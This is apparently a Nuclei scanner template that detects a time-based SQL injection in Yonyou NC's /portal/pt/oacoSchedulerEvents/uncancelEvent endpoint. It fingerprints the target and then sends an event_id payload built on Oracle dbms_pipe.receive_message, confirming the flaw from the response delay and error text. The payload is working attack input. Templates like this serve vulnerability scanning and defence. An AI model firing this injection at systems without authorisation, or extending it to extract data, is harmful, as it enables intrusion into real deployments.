id: yonyou-ufida-nc-uncancelevent-sqli
info:
  name: Yonyou NC uncancelEvent SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "ufida"

  - raw:
      - |
        POST /portal/pt/oacoSchedulerEvents/uncancelEvent?pageId=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        event_id=-1'AND 1=dbms_pipe.receive_message('RDS',{{t1}})--+#+&startDate=2025-05-07 12:12:12&event_ts=2025-05-07 12:12:12&event_ts=2025-05-07 12:12:12

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "Error"
          - "invalid UFDateTime"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
